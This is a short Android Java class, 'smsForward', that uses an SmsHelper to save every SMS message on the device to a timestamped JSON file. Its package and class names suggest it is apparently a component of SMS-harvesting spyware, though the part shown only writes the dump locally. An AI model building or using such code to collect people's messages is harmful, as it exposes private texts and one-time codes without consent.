package test.com.accessibility.core.sms;

import android.content.Context;
import test.com.accessibility.util.smsForwarding.SmsHelper;

public class smsForward {

    private SmsHelper sms_helper = null;

    public void init(Context context) {
        sms_helper = new SmsHelper(context);
    }

    public void startForwarding(String root_folder){
        String path = root_folder+"/sms_text_"+System.currentTimeMillis()+".json";
        sms_helper.saveAllSms(path);
    }

}
